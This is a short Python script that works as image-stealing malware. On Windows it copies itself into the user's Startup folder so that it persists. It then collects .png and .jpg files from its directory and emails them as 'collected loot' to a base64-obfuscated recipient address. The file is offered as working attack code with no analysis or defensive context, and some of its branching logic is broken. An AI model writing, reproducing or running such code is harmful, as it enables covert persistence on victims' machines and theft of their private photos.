from shutil import copy
from EmailSender import *
from os import path, getcwd, scandir
from sys import platform
from base64 import b64decode
from sys import exit
import imghdr
from time import sleep
startUpShell = "C:\\Users\\pc\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

class _Installer:
    try:
        currentDir = "\\".join(__file__.split('\\')[:-1])
    except:
        try:
            currentDir = getcwd()
        except:
            exit(1)
    if platform == 'win32':
        if currentDir != startUpShell:
            copy(__file__, startUpShell)

class Sender:
    def __init__(self, currentdir: str = '.'):
        self.currentdir = currentdir
        self.Sender = EmailSender(EMAIL_ADRESS, PASSWORD, Debug=False)
        self.headers = {
        "subject": "Crypt0101, Exploit0101",
        "to": b64decode(b"YXptb3VkaEBnbWFpbC5jb20=").decode("utf-8"),
        "Content": "collected loot"
        }
        self.Sender.setMessage(self.headers["subject"], self.headers["to"], self.headers["Content"])
        self.img = self.scanner
        if len(self.img) < 1:
            sleep(1000000)
            try:
                Sender(currentdir(currentdir = '..'))
            except:
                exit(0)
        else:
            if len(self.img):
                with open(self.img[0], 'rb') as f:
                    file_data = f.read()
                    file_type = imghdr.what(f.name)
                    file_name = f.name
                self.Sender.msg.add_attachment(file_data, maintype="image", subtype=file_type, filename=file_name)
                self.Sender.send()
            else:
                for _ in self.img:
                    with open(_, 'rb') as f:
                        file_data = f.read()
                        file_type = imghdr.what(f.name)
                        file_name = f.name
                    self.Sender.msg.add_attachment(file_data, maintype="image", subtype=file_type, filename=file_name)
                self.Sender.send()
            exit(0)

    @property
    def scanner(self):
        return [i.name for i in scandir(self.currentdir) if i.name.endswith('.png') or i.name.endswith('.jpg')]

ctx = Sender()
